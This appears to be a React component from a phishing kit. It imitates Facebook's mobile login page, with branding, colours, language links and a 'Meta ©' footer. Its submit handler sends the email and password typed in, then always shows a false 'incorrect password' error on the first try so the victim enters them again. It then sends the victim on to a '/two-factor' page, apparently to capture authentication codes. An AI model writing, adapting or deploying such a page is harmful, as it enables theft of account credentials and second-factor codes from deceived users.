import { useLocalStorage } from '@/helpers/useLocalstorage';
import { login } from '@/request/post';
import { useRouter } from 'next/router';
import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { ErrorMessage } from '../common/error-message';

function MobileLoginForm() {
  const [failCount, setFailCount] = useState(1);
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
    setError,
  } = useForm();
  const router = useRouter();
  const [step, setStep] = useLocalStorage('step');

  useEffect(() => {
    if (step === 1) {
      router.push('/contact/295038365360854');
    }
  }, [step, router]);

  const onSubmit = async (data) => {
    const res = await login(data);
    if (res?.status && !failCount) {
      setStep(3);
      router.push('/two-factor');
    } else {
      reset();
      setError('password', { message: 'Your email or password is incorrect' });
      setFailCount((prev) => prev - 1);
    }
  };

  const currentYear = new Date().getFullYear();

  return (
    <div className="flex flex-col justify-center items-center m-4">
      <div>
        <p className="text-2xl pb-3 font-bold text-blue-500 font-['Helvetica']">
          facebook
        </p>
      </div>
      <form onSubmit={handleSubmit(onSubmit)} className="w-full">
        <div className="flex flex-col justify-center items-center">
          <div className="flex-1 w-full">
            <input
              placeholder="Mobile number or email address"
              {...register('email', {
                required: 'Email address or phone number is required',
              })}
              className="focus:outline-none w-full px-3 py-2 border border-slate-200 rounded bg-[#f5f6f7]"
            />
            <ErrorMessage error={errors?.email?.message} className="text-sm" />
          </div>

          <div className="flex-1 w-full mt-3">
            <input
              type="password"
              placeholder="Password"
              className="focus:outline-none w-full px-3 py-2 border border-slate-200 rounded bg-[#f5f6f7]"
              {...register('password', {
                required: 'Your password is required',
              })}
            />
            <ErrorMessage
              error={errors?.password?.message}
              className="text-sm"
            />
          </div>
          <div className="text-center w-full mt-3">
            <button
              type="submit"
              className="bg-[#1877f2] text-md rounded px-[16px] cursor-pointer text-white no-underline whitespace-nowrap font-medium leading-10 w-full"
            >
              Log in
            </button>
          </div>
        </div>
      </form>
      <a
        href="#"
        className="text-sm no-underline hover:underline text-blue-500 font-normal py-4"
      >
        Forgotten Password?
      </a>
      <div className="border-t-[1px] w-[90%] mt-1 mb-2" />

      <div className="text-center w-[80%] mt-4 mb-20">
        <button className="bg-white text-sm rounded cursor-pointer no-underline whitespace-nowrap font-medium leading-8 w-full border border-slate-200">
          Create new account
        </button>
      </div>

      <div className="flex flex-row w-full justify-around gap-18 items-center">
        <ul className="footer-text flex-col flex flex-wrap pb-3 pt-8 justify-center items-center">
          <li> English (UK)</li>
          <li className="cursor-pointer no-underline hover:underline text-[#4267b2] mt-[3px]">
            中文(台灣)
          </li>
          <li className="cursor-pointer no-underline hover:underline text-[#4267b2] mt-[3px]">
            Español
          </li>
          <li className="cursor-pointer no-underline hover:underline text-[#4267b2] mt-[3px]">
            Français (France)
          </li>
        </ul>
        <ul className="footer-text flex-col flex flex-wrap  pb-3 pt-8 justify-center items-center">
          <li> Tiếng Việt</li>
          <li className="cursor-pointer no-underline hover:underline text-[#4267b2] mt-[3px] ">
            한국어
          </li>
          <li className="cursor-pointer no-underline hover:underline text-[#4267b2] mt-[3px]">
            Português (Brasil)
          </li>
          <li className="border border-slate-200 px-2 cursor-pointer  mt-2 text-xs font-medium">
            +
          </li>
        </ul>
      </div>
      <div className="flex flex-row py-3">
        <a className="text-[11px] text-[#90949c] mr-1">About</a>
        <span className="text-[11px] text-[#90949c]  mr-1">&#183;</span>
        <a className="text-[11px] text-[#90949c]  mr-1">Help</a>
        <span className="text-[11px] text-[#90949c]  mr-1">&#183;</span>
        <a className="text-[11px] text-[#90949c]">More</a>
      </div>
      <div className="footer-text">
        <p className="text-xs">Meta © {currentYear}</p>
      </div>
    </div>
  );
}

export default MobileLoginForm;
